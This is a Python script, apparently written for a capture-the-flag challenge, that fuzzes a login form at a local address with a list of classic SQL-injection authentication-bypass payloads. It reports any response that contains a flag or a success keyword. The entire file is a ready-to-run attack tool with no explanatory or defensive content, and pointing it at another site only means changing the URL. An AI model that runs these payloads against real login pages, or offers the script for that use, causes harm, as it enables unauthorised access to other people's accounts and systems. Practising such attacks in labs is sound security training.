#!/usr/bin/env python3
import re
import requests

TARGET_URL = "http://127.0.0.1:8103/"
USERNAME_FIELD = "username"
PASSWORD_FIELD = "password"

SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "admin' --",
    "admin' #",
    "' OR 1=1 #",
    "') OR ('1'='1",
    "' OR 'a'='a",
    "1' ORDER BY 1--",
    "' OR 1=1 LIMIT 1 --",
    "' OR 'x'='x' --",
]

SUCCESS_KEYWORDS = [
    "flag{",
    "welcome",
    "logged in",
    "login successful",
    "admin",
    "dashboard",
    "success",
    "session",
    "logout",
]

def extract_flag(response_text: str):
    match = re.search(r"flag\{[^}]+\}", response_text, flags=re.IGNORECASE)
    return match.group(0) if match else None

def looks_like_success(response_text: str) -> bool:
    text = response_text.lower()
    return any(keyword in text for keyword in SUCCESS_KEYWORDS)

def main():
    print(f"[*] Avvio SQLi Auth Bypass Fuzzer su Target: {TARGET_URL}\n")
    session = requests.Session()

    found = False

    for payload in SQLI_PAYLOADS:
        form_data = {
            USERNAME_FIELD: payload,
            PASSWORD_FIELD: "password_fittizia_123"
        }

        print(f"[*] Testing Payload: {payload!r}")

        try:
            response = session.post(
                TARGET_URL,
                data=form_data,
                timeout=5,
                allow_redirects=True
            )

            status = response.status_code
            final_url = response.url
            history = len(response.history)
            body = response.text

            print(f"    -> status: {status} | redirects: {history} | final_url: {final_url}")

            flag = extract_flag(body)
            if flag:
                print("\n=== SQL INJECTION AUTH BYPASS RIUSCITO! ===")
                print(f" Payload Vincente : {payload}")
                print(f" Flag Trovata     : {flag}")
                print("===========================================\n")
                found = True
                break

            if looks_like_success(body):
                print("\n=== RISPOSTA DI SUCCESSO RILEVATA ===")
                print(f" Payload Potenzialmente Vantaggioso: {payload}")
                print(f" Primo snippet: {body[:500]}")
                print("===========================================\n")
                found = True
                break

            if status in (200, 301, 302, 303, 403):
                snippet = body[:300].replace("\n", " ").strip()
                if snippet:
                    print(f"    -> snippet: {snippet[:200]}")

        except Exception as e:
            print(f"[!] Errore durante l'invio della richiesta: {e}")

    if not found:
        print("[!] Nessun payload della lista ha bypassato l'autenticazione.")
        print("[!] Controlla se:")
        print("    - il target è giusto")
        print("    - i campi del form hanno nomi diversi")
        print("    - la pagina fa redirect")
        print("    - il sito non è vulnerabile o usa protezioni")

if __name__ == "__main__":
    main()
